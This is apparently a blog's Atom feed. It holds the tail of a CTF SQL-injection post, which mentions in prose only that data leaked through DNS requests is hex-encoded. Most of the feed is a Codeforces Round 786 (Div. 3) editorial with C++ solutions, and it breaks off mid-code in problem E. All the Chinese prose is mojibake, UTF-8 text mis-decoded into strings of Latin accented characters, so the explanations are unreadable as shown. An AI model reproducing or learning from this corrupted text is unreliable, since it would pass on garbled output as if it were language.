è¯·æ±‚è¦çš„æ—¶é—´ä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯æ¯”ç›²æ³¨è¦å¥½ä¸€ç‚¹ã€‚</p><p>åŸŸåè‹¥å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦ä¼šå¯¼è‡´è¯·æ±‚å¤±è´¥ï¼Œå› æ­¤åœ¨è‹¥æ³„éœ²çš„ä¿¡æ¯æœ‰ç‰¹æ®Šç¬¦å·æ³¨æ„ç¼–ç ä¸€ä¸‹ï¼Œç”¨ <code>hex</code> å»ç¼–ç å°±å¥½äº†ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><code>sql</code> æ³¨å…¥ä¹Ÿå°±å­¦äº†è¿™ä¹ˆå¤šï¼Œæš‚æ—¶å…ˆå†™åˆ°è¿™é‡Œå§ï¼Œåç»­å­¦äº†æ–°çš„èŠå£«å†æ¥è¡¥å……ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sqlå­¦äº†ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæƒ³ç€æŠŠèƒ½ç”¨åˆ°çš„çŸ¥è¯†ç‚¹éƒ½å†™ä¸€éå¥½ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://example.com/categories/ctf/web/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 786(Div.3)</title>
    <link href="http://example.com/2022/05/03/Codeforces%20Round%20786(Div.3)/"/>
    <id>http://example.com/2022/05/03/Codeforces%20Round%20786(Div.3)/</id>
    <published>2022-05-03T04:00:00.000Z</published>
    <updated>2022-05-03T06:40:44.485Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1674">Codeforces Round #786 (Div. 3)</a>é¢˜è§£æ¥äº†</p><p>å®æ—¶å½•é¢‘åœ¨<a href="https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Number-Transformation"><a href="#A-Number-Transformation" class="headerlink" title="A. Number Transformation"></a>A. Number Transformation</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´è®©ä½ æ‰¾åˆ°ä¸¤ä¸ªæ•° $a,b$ï¼Œä½¿å¾— $x\times a^b=y$ è¿™é‡Œå¯ä»¥ä½¿å¾— $b=1$ ç„¶åå°±åˆ¤æ–­ä¸€ä¸‹ $y\ mod\ x=0$ æ˜¯å¦æˆç«‹å³å¯ã€‚ </p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">if</span>(y%x==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 %d\n&quot;</span>,y/x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0 0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dictionary"><a href="#B-Dictionary" class="headerlink" title="B. Dictionary"></a>B. Dictionary</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²çš„å­—å…¸åºï¼Œå­—ç¬¦ä¸²åªæœ‰2ä¸ªå­—ç¬¦ï¼Œç„¶åä¸¤ä¸ªå­—ç¬¦åº”è¯¥ä¸èƒ½ä¸€æ ·ï¼Œè¿™æ ·çš„è¯ç›´æ¥ç”¨å…¬å¼å°±å¥½äº†ï¼Œå¦‚æœèƒ½ä¸€æ ·ï¼Œè¿™ä¸ªå…¬å¼åº”è¯¥æ˜¯ $(a[0]-â€˜aâ€™)\times 26+a[1]-â€˜aâ€™$ çš„ï¼Œè¿™é‡Œæ—¢ç„¶ä¸èƒ½ä¸€æ ·é‚£å°±éƒ½å‡ä¸€å°±å¥½äº†ï¼Œä½†æ˜¯è¦æ³¨æ„ï¼Œå¦‚æœ $a[1]$ ä¸è¶…è¿‡ $a[0]$ åˆ™ä¸éœ€è¦å‡ä¸€ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)*<span class="number">25</span>+(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)-(s[<span class="number">1</span>]&gt;s[<span class="number">0</span>])+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Infinite-Replacement"><a href="#C-Infinite-Replacement" class="headerlink" title="C. Infinite Replacement"></a>C. Infinite Replacement</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´ä¸€ä¸ªå­—ç¬¦ä¸² $s$ åªåŒ…å« $a$ï¼Œ$a$ å¯ä»¥ç”¨å¦ä¸€ä¸ªå­—ç¬¦ä¸² $t$ æ›¿ä»£ï¼Œé—®æœ‰å¤šå°‘ç§æ›¿æ¢çš„ç»“æœï¼Œæ›¿æ¢å¯ä»¥æœ‰æ— é™æ¬¡ã€‚</p><p>é¦–å…ˆä¸éš¾å‘ç°ï¼Œå¦‚æœ $t$ ==â€$a$â€ é‚£ä¹ˆæˆ‘æ›¿æ¢æ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œç­”æ¡ˆä¸º $1$ã€‚</p><p>å…¶æ¬¡å¦‚æœ $t$ ä¸åŒ…å« â€œ$a$â€ï¼Œé‚£ä¹ˆå¯¹äº $s$ çš„æ¯ä¸ªä½ç½®çš„ â€œ$a$â€ï¼Œæœ‰æ›¿æ¢å’Œä¸æ›¿æ¢ä¸¤ç§é€‰æ‹©ï¼Œç­”æ¡ˆå°±æ˜¯$2^{strlen(s)}$ã€‚</p><p>åªå‰©ä¸‹åŒ…å«â€$a$â€çš„é•¿åº¦ä¸ä¸º $1$ çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°å…è®¸è¿›è¡Œæ— é™æ¬¡æ›¿æ¢ï¼Œç›´æ¥ $-1$ å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn],t[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span> &amp;&amp; t[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="number">1ll</span>&lt;&lt;<span class="built_in">strlen</span>(s));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-A-B-C-Sort"><a href="#D-A-B-C-Sort" class="headerlink" title="D. A-B-C Sort"></a>D. A-B-C Sort</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><p><strong>a-&gt;b</strong><br>é€‰æ‹©æœ€åä¸€ä¸ªå…ƒç´ æ”¾åœ¨ï½‚æ•°ç»„çš„ä¸­é—´<br><strong>b-&gt;c</strong><br>é€‰æ‹©ä¸­é—´å…ƒç´ æ”¾åœ¨cæ•°ç»„çš„åé¢</p><p>ç›¸å½“äºè¿™æ ·ï¼š<br>æŒ‰ä¸€å®šé¡ºåºå°†å…ƒç´ å‹å…¥ä¸¤ä¸ªæ ˆä¸­ï¼Œç„¶ååˆ†åˆ«å¼¹å‡ºè§‚å¯Ÿæ˜¯å¦èƒ½é€’å¢ã€‚<br>å¦‚æœåºåˆ—é•¿åº¦ä¸ºå¶æ•°ï¼Œåˆ™1,2å…ƒç´ å‡å°äº3ï¼Œ4å…ƒç´ ï¼Œ3ï¼Œ4å…ƒç´ å‡å°äº5ï¼Œ6å…ƒç´ â€¦â€¦<br>å¦‚æœä¸ºå¥‡æ•°ï¼Œåˆ™1å…ƒç´ éœ€è¦æœ€å°ï¼Œ2,3éœ€è¦å°äº,4,5â€¦â€¦<br>æ¨¡æ‹Ÿä¸€ä¸‹å°±ok</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,x,y;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[++cnt]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=cnt;i&lt;n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">        <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[++cnt]=x;</span><br><span class="line">            a[++cnt]=y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i+<span class="number">1</span>]&lt;a[i])NO</span><br><span class="line">    &#125;</span><br><span class="line">    OK</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Breaking-the-Wall"><a href="#E-Breaking-the-Wall" class="headerlink" title="E. Breaking the Wall"></a>E. Breaking the Wall</h2><h3 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/5.png" alt="5"></p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜è¢«æ€ç–¯äº†ï¼Œç»“æŸçš„æ—¶å€™ $3000AC$ åˆ°ç°åœ¨å°±å‰©ä¸‹ $200$ å¤šä¸ªäº†ï¼Œä¸»è¦æ˜¯æ•°æ®é”…äº†ã€‚</p><p>åªéœ€è¦è€ƒè™‘ä¸‰ç§æƒ…å†µï¼Œç›¸é‚»çš„å¢™ï¼Œéš”ä¸€ä¸ªçš„å¢™å’Œæœ€å°ä¸¤ä¸ªå¢™ï¼Œç»™ä½ çš„æµ‹è¯•æ•°æ®å¾ˆå……è¶³ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ç‚¹ä¸è¡Œï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ–°å†™çš„èƒ½ä¸èƒ½è¿‡ã€‚</p><h3 id="æ ‡ç¨‹-4"><a href="#æ ‡ç¨‹-4" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//ï¿ Ã¹ </span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first=a[i],second=a[i+<span 